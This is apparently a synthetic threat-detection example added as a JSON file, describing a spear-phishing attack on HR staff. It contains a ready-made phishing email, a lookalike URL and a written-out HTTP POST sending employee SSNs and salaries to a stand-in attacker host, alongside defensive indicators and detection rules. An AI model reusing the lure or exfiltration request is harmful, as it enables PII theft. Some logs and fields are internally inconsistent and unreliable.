@@ -1,0 +1,57 @@
+{
+  "examples": [
+    {
+      "scenario": "Spear-phishing campaign targeting HR personnel with a convincing fake payroll update email containing a malicious link designed to steal employee PII.",
+      "technical_data": {
+        "email_headers": "Return-Path: <payroll@secure-payrollcorp.com>\r\nReceived: from mail.secure-payrollcorp.com (mail.secure-payrollcorp.com [198.51.100.23])\r\n\tby mail.enterprise.com (Postfix) with ESMTPS id 3F21B9034D\r\n\tfor <hr@enterprise.com>; Tue, 04 Apr 2023 08:42:07 -0400 (EDT)\r\nReceived-SPF: pass (enterprise.com: domain of payroll@secure-payrollcorp.com designates 198.51.100.23 as permitted sender) receiver=enterprise.com; client-ip=198.51.100.23; envelope-from=payroll@secure-payrollcorp.com; helo=mail.secure-payrollcorp.com;\r\nAuthentication-Results: enterprise.com; dkim=pass header.d=secure-payrollcorp.com; spf=pass smtp.mailfrom=payroll@secure-payrollcorp.com; dmarc=pass (p=none) header.from=secure-payrollcorp.com\r\nX-Originating-IP: [198.51.100.23]\r\nX-Mailer: Microsoft Outlook 16.0\r\nMessage-ID: <CAK2+f5Xk@mail.secure-payrollcorp.com>\r\nDate: Tue, 04 Apr 2023 08:42:05 -0400\r\nFrom: Payroll Updates <payroll@secure-payrollcorp.com>\r\nTo: hr@enterprise.com\r\nSubject: Urgent: Updated Payroll Information Required\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=\"UTF-8\"\r\nContent-Transfer-Encoding: quoted-printable",
+        "email_body": "<html><body><p>Dear HR Team,</p><p>Due to recent policy updates, please verify the attached payroll information and submit updated employee data by <b>April 6, 2023</b>.</p><p><a href=\"http://secure-payrollcorp.com.verify-payroll-update.com/login.php?user=hr&session=9f8e7d6c5b4a3\">Click here to access the secure payroll portal</a></p><p>Failure to comply may result in payroll processing delays.</p><p>Regards,<br>Payroll Department</p></body></html>",
+        "suspicious_url": "http://secure-payrollcorp.com.verify-payroll-update.com/login.php?user=hr&session=9f8e7d6c5b4a3",
+        "smtp_transaction_log": "220 mail.secure-payrollcorp.com ESMTP Postfix\r\nEHLO mail.enterprise.com\r\n250-mail.secure-payrollcorp.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<payroll@secure-payrollcorp.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<hr@enterprise.com>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: Payroll Updates <payroll@secure-payrollcorp.com>\r\nTo: hr@enterprise.com\r\nSubject: Urgent: Updated Payroll Information Required\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=\"UTF-8\"\r\n\r\n<html>...</html>\r\n.\r\n250 2.0.0 Ok: queued as 3F21B9034D\r\nQUIT\r\n221 2.0.0 Bye",
+        "domain_registration": {
+          "domain": "secure-payrollcorp.com.verify-payroll-update.com",
+          "registrar": "NameCheap, Inc.",
+          "creation_date": "2023-03-20T15:12:00Z",
+          "expiration_date": "2024-03-20T15:12:00Z",
+          "registrant_org": "Privacy Protection Service",
+          "registrant_country": "RU"
+        },
+        "dns_records": {
+          "A": [
+            "198.51.100.23"
+          ],
+          "MX": [
+            "mail.verify-payroll-update.com"
+          ],
+          "TXT": [
+            "v=spf1 ip4:198.51.100.23 -all"
+          ]
+        },
+        "webserver_access_log": "198.51.100.23 - - [04/Apr/2023:08:43:15 -0400] \"GET /login.php?user=hr&session=9f8e7d6c5b4a3 HTTP/1.1\" 200 3472 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/108.0.0.0 Safari/537.36\"",
+        "network_packet_capture_snippet": "Frame 1: 562 bytes on wire (4496 bits), 562 bytes captured (4496 bits)\nEthernet II, Src: 00:0c:29:ab:cd:ef, Dst: 00:50:56:12:34:56\nInternet Protocol Version 4, Src: 198.51.100.23, Dst: 192.168.1.87\nTransmission Control Protocol, Src Port: 80, Dst Port: 52344, Seq: 1, Ack: 1, Len: 508\nHypertext Transfer Protocol\n    GET /login.php?user=hr&session=9f8e7d6c5b4a3 HTTP/1.1\r\n    Host: secure-payrollcorp.com.verify-payroll-update.com\r\n    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n    Accept: text/html\r\n",
+        "payload_obfuscation": "URL uses subdomain 'secure-payrollcorp.com' appended before the legitimate domain 'verify-payroll-update.com' to deceive the recipient; URL encoding applied to some query parameters: 'session=9f8e7d6c5b4a3' encoded as 'session=9f8e7d6c5b4a3' (no changes, but mimics session token format).",
+        "post-exploitation_artifacts": {
+          "stolen_data_exfiltration_http": "POST /exfiltrate.php HTTP/1.1\r\nHost: attacker-server.com\r\nContent-Type: application/json\r\nContent-Length: 234\r\n\r\n{\"employee_id\":\"E12345\",\"ssn\":\"123-45-6789\",\"dob\":\"1985-06-15\",\"salary\":\"85000\"}",
+          "hr_system_login_attempts": "Apr 04 09:15:21 hr-system enterprise-sshd[4512]: Accepted password for hr_user from 198.51.100.23 port 44231 ssh2",
+          "mfa_bypass_attempt": "Apr 04 09:15:30 hr-system mfa-service[1023]: Authentication challenge failed for user hr_user from IP 198.51.100.23"
+        }
+      },
+      "indicators": [
+        "Suspicious domain 'secure-payrollcorp.com.verify-payroll-update.com' with recent registration and privacy-protected registrant",
+        "Email with SPF, DKIM passing but sent from external IP 198.51.100.23 not known to enterprise",
+        "URL uses subdomain trick to impersonate legitimate payroll domain",
+        "Access logs show HR user agent accessing phishing login page",
+        "Exfiltration POST request to attacker-server.com with JSON containing employee PII",
+        "Multiple failed MFA attempts on HR system from external IP"
+      ],
+      "detection_method": "Deploy email gateway filters to detect domains using subdomain tricks and new registrations; monitor outbound HTTP POST requests from HR desktop IPs to suspicious external servers; alert on failed MFA attempts from unfamiliar IPs; implement URL rewriting and scanning to identify obfuscated phishing links; network IDS signatures for suspicious HTTP POST payloads containing JSON employee data.",
+      "relevant_mitre_techniques": [
+        "T1192 - Spearphishing Link",
+        "T1566.002 - Spearphishing via Link",
+        "T1078 - Valid Accounts",
+        "T1110 - Brute Force",
+        "T1537 - Transfer Data to Cloud Account",
+        "T1056 - Input Capture"
+      ]
+    }
+  ]
+}
